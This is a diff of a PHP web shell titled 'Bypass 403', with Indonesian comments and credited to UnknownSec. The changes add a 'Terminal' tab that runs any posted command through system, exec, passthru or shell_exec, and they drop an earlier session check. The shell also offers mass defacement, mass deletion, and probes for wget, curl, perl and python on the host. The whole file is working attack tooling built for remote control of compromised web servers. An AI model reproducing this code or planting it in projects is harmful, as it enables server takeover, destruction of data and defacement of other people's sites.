@@ -1,36 +1,108 @@
 <?php
-/* Gw doain kalo lu recode tytyd lu jadi kecil */
-set_time_limit(0);
-error_reporting(0);
-/* Ini bisa di ganti sesuai kemauan kalian */
-$name = "root";
-@session_start();
-function login()
-	{
-phpinfo();
-exit;
-	}
-if(!isset($_SESSION[md5($log)])) {
-if(isset($_GET[$name]) && $_GET[$name] == $name) {
-	$_SESSION[md5($log)] = true;
-} else {
-	login();
-	}
-}
-?>
-<?php
-
+/*	~ Gw doain kalo lu recode tytyd lu jadi kecil
+	~ untuk beberapa tools gw ambil dari indoxploit, karena tidak semuanya gw otakin sendiri. */
 header("X-XSS-Protection: 0");
 ob_start();
 set_time_limit(0);
 error_reporting(0);
 ini_set('display_errors', FALSE);
 
+function uns($dir,$ps) {
+if (isset($_GET['path'])) {
+	$lokasi = $_GET['path'];
+} else {
+	$lokasi = getcwd();
+}
+if (is_writable($lokasi)) {
+	return "<font color='green'>".$ps."</font>";
+} else {
+	return "<font color='red'>".$ps."</font>";
+	}
+}
+function ip() {
+	$ipas = '';
+if (getenv('HTTP_CLIENT_IP'))
+	$ipas = getenv('HTTP_CLIENT_IP');
+else if(getenv('HTTP_X_FORWARDED_FOR'))
+	$ipas = getenv('HTTP_X_FORWARDED_FOR');
+else if(getenv('HTTP_X_FORWARDED'))
+	$ipas = getenv('HTTP_X_FORWARDED');
+else if(getenv('HTTP_FORWARDED_FOR'))
+	$ipas = getenv('HTTP_FORWARDED_FOR');
+else if(getenv('HTTP_FORWARDED'))
+	$ipas = getenv('HTTP_FORWARDED');
+else if(getenv('REMOTE_ADDR'))
+	$ipas = getenv('REMOTE_ADDR');
+else
+	$ipas = 'IP tidak dikenali';
+return $ipas;
+}
+function exe($cmd) {
+if(function_exists('system')) {
+	@ob_start();
+	@system($cmd);
+	$buff = @ob_get_contents();
+	@ob_end_clean();
+	return $buff;
+} elseif(function_exists('exec')) {
+	@exec($cmd,$results); 
+	$buff = "";
+	foreach($results as $result) {
+		$buff .= $result;
+	} return $buff;
+} elseif(function_exists('passthru')) {
+	@ob_start();
+	@passthru($cmd);
+	$buff = @ob_get_contents();
+	@ob_end_clean();
+	return $buff;
+} elseif(function_exists('shell_exec')) {
+	$buff = @shell_exec($cmd);
+	return $buff;
+	} 
+}
+function ps($file){
+$ps = fileperms($file);
+if (($ps & 0xC000) == 0xC000) {
+$if = 's';
+} elseif (($ps & 0xA000) == 0xA000) {
+$if = 'l';
+} elseif (($ps & 0x8000) == 0x8000) {
+$if = '-';
+} elseif (($ps & 0x6000) == 0x6000) {
+$if = 'b';
+} elseif (($ps & 0x4000) == 0x4000) {
+$if = 'd';
+} elseif (($ps & 0x2000) == 0x2000) {
+$if = 'c';
+} elseif (($ps & 0x1000) == 0x1000) {
+$if = 'p';
+} else {
+$if = 'u';
+	}
+$if .= (($ps & 0x0100) ? 'r' : '-');
+$if .= (($ps & 0x0080) ? 'w' : '-');
+$if .= (($ps & 0x0040) ?
+(($ps & 0x0800) ? 's' : 'x' ) :
+(($ps & 0x0800) ? 'S' : '-'));
+$if .= (($ps & 0x0020) ? 'r' : '-');
+$if .= (($ps & 0x0010) ? 'w' : '-');
+$if .= (($ps & 0x0008) ?
+(($ps & 0x0400) ? 's' : 'x' ) :
+(($ps & 0x0400) ? 'S' : '-'));
+$if .= (($ps & 0x0004) ? 'r' : '-');
+$if .= (($ps & 0x0002) ? 'w' : '-');
+$if .= (($ps & 0x0001) ?
+(($ps & 0x0200) ? 't' : 'x' ) :
+(($ps & 0x0200) ? 'T' : '-'));
+return $if;
+	}
 echo '
 <!DOCTYPE HTML>
 <html>
 	<head>
 		<meta name="author" content="UnknownSec">
+		<meta name="robots" content="NOINDEX, NOFOLLOW">
 		<meta name="viewport" content="width=device-width, initial-scale=0.70, user-scalable=no">
 		<title>'.$_SERVER['HTTP_HOST'].' - Bypass 403</title>
 		<link rel="stylesheet" href="//unknownsec1337.github.io/main/style.css" type="text/css">
@@ -72,6 +144,7 @@ echo '
 				<a class='dropdown-item' href='?path=$path&id=df'><i class='fas fa-theater-masks'></i> Mass depes</a>
 				<a class='dropdown-item' href='?path=$path&id=dl'><i class='far fa-trash-alt'></i> Mass delete</a>
 				<a class='dropdown-item' href='?path=$path&id=nt'><i class='fas fa-network-wired'></i> Network</a>
+				<a class='dropdown-item' href='?path=$path&id=cm'><i class='fas fa-terminal'></i> Terminal</a>
 				<a class='dropdown-item' href='?path=$path&id=if'><i class='fas fa-info-circle'></i> Info</a>
 				<a class='dropdown-item' href='?path=$path&id=ab'><i class='fas fa-info'></i> About</a></h5>
 				</div>
@@ -215,53 +288,24 @@ echo "<br /><style>table{display:none;}</style>
 	}
 }
 elseif($_GET['id'] == 'if'){
-function ip() {
-	$ipaddress = '';
-if (getenv('HTTP_CLIENT_IP'))
-	$ipaddress = getenv('HTTP_CLIENT_IP');
-else if(getenv('HTTP_X_FORWARDED_FOR'))
-	$ipaddress = getenv('HTTP_X_FORWARDED_FOR');
-else if(getenv('HTTP_X_FORWARDED'))
-	$ipaddress = getenv('HTTP_X_FORWARDED');
-else if(getenv('HTTP_FORWARDED_FOR'))
-	$ipaddress = getenv('HTTP_FORWARDED_FOR');
-else if(getenv('HTTP_FORWARDED'))
-	$ipaddress = getenv('HTTP_FORWARDED');
-else if(getenv('REMOTE_ADDR'))
-	$ipaddress = getenv('REMOTE_ADDR');
-else
-	$ipaddress = 'IP tidak dikenali';
-return $ipaddress;
-}
-function browser() {
-	$browser = '';
-if(strpos($_SERVER['HTTP_USER_AGENT'], 'Netscape'))
-	$browser = 'Netscape';
-else if (strpos($_SERVER['HTTP_USER_AGENT'], 'Firefox'))
-	$browser = 'Firefox';
-else if (strpos($_SERVER['HTTP_USER_AGENT'], 'Chrome'))
-	$browser = 'Chrome';
-else if (strpos($_SERVER['HTTP_USER_AGENT'], 'Opera'))
-	$browser = 'Opera';
-else if (strpos($_SERVER['HTTP_USER_AGENT'], 'MSIE'))
-	$browser = 'Internet Explorer';
-else
-	$browser = 'Other';
-return $browser;
-}
+$mysql = (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
+$curl = (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
+$wget = (exe('wget --help')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
+$perl = (exe('perl --help')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
+$python = (exe('python --help')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
 $sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<font color=red>ON</font>" : "<font color=green>OFF</font>";
 echo '<br /><style>table{display:none;}</style>
 <div class="container">
 	<div class="card text-dark">
 		<div class="card-header">';
-echo "<b>Uname : </b><font color=green>".php_uname()."</font><br />";
-echo "<b>Software : </b><font color=green>".$_SERVER['SERVER_SOFTWARE']."</font><br />";
-echo "<b>PHP version : </b><font color=green>".PHP_VERSION."</font> <b>PHP os :</b> <font color=green>".PHP_OS."</font><br />";
-echo "<b>Server Ip : </b><font color=green>".gethostbyname($_SERVER['HTTP_HOST'])."</font><br />";
-echo "<b>Your Ip : </b><font color=green>".ip()."</font><br />";
-echo "<b>User : </b><font color=green>".@get_current_user()."</font> [ <font color=green>".@getmyuid()."</font> ]<br />";
-echo "<b>Safe Mode : </b>".$sm."<br />";
-echo "<b>Browser : </b><font color=green>".browser()."</font><br />";
+echo "<b>Uname: </b><font color=green>".php_uname()."</font><br />";
+echo "<b>Software: </b><font color=green>".$_SERVER['SERVER_SOFTWARE']."</font><br />";
+echo "<b>PHP version: </b><font color=green>".PHP_VERSION."</font> <b>PHP os:</b> <font color=green>".PHP_OS."</font><br />";
+echo "<b>Server Ip: </b><font color=green>".gethostbyname($_SERVER['HTTP_HOST'])."</font><br />";
+echo "<b>Your Ip: </b><font color=green>".ip()."</font><br />";
+echo "<b>User: </b><font color=green>".@get_current_user()."</font> [ <font color=green>".@getmyuid()."</font> ]<br />";
+echo "<b>Safe Mode: </b>".$sm."<br />";
+echo "<b>MySQL:</b> $mysql | <b>Perl:</b> $perl | <b>Python:</b> $python | <b>WGET:</b> $wget | <b>CURL:</b> $curl ";
 	echo '</div>
 	</div>
 </div>';
@@ -276,6 +320,20 @@ echo "Thanks bre dah pake shell nya, jika ada yang error silahkan hubungi email 
 	echo '</div>
 	</div>
 </div>';
+}
+elseif($_GET['id'] == 'cm') {
+	echo "<br /><style>table{display:none;}</style>
+<form method='post'>
+	<div class='input-group mb-3''>
+		<input type='text' class='form-control' name='cmd'>
+	<div class='input-group-append'>
+		<input class='btn btn-primary' type='submit' name='do_cmd' value='Go'>
+	</form>
+	</div>
+</div>";
+	if($_POST['do_cmd']) {
+echo "<textarea class='form-control' rows='7'>".exe($_POST['cmd'])."</textarea>";
+	}
 }
 elseif($_GET['id'] == 'up'){
 echo '<br /><style>table{display:none;}</style>
@@ -599,7 +657,7 @@ echo '<tr>
 	}elseif($ex == "ico"){
 		echo 'far fa-file-image';
 	}elseif($ex == "htaccess"){
-		echo 'far fa-file-code';
+		echo 'fas fa-code';
 	}elseif($ex == "sh"){
 		echo 'far fa-file-code';
 	}elseif($ex == "py"){
@@ -664,53 +722,4 @@ echo "
 <script src='//stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js'></script>
 </body>
 </html>";
-function uns($dir,$ps) {
-	if (isset($_GET['path'])) {
-		$lokasi = $_GET['path'];
-	} else {
-		$lokasi = getcwd();
-	}
-	if (is_writable($lokasi)) {
-		return "<font color='green'>".$ps."</font>";
-	} else {
-		return "<font color='red'>".$ps."</font>";
-	}
-}
-
-function ps($file){
-$ps = fileperms($file);
-if (($ps & 0xC000) == 0xC000) {
-$if = 's';
-} elseif (($ps & 0xA000) == 0xA000) {
-$if = 'l';
-} elseif (($ps & 0x8000) == 0x8000) {
-$if = '-';
-} elseif (($ps & 0x6000) == 0x6000) {
-$if = 'b';
-} elseif (($ps & 0x4000) == 0x4000) {
-$if = 'd';
-} elseif (($ps & 0x2000) == 0x2000) {
-$if = 'c';
-} elseif (($ps & 0x1000) == 0x1000) {
-$if = 'p';
-} else {
-$if = 'u';
-	}
-$if .= (($ps & 0x0100) ? 'r' : '-');
-$if .= (($ps & 0x0080) ? 'w' : '-');
-$if .= (($ps & 0x0040) ?
-(($ps & 0x0800) ? 's' : 'x' ) :
-(($ps & 0x0800) ? 'S' : '-'));
-$if .= (($ps & 0x0020) ? 'r' : '-');
-$if .= (($ps & 0x0010) ? 'w' : '-');
-$if .= (($ps & 0x0008) ?
-(($ps & 0x0400) ? 's' : 'x' ) :
-(($ps & 0x0400) ? 'S' : '-'));
-$if .= (($ps & 0x0004) ? 'r' : '-');
-$if .= (($ps & 0x0002) ? 'w' : '-');
-$if .= (($ps & 0x0001) ?
-(($ps & 0x0200) ? 't' : 'x' ) :
-(($ps & 0x0200) ? 'T' : '-'));
-return $if;
-	}
 ?>
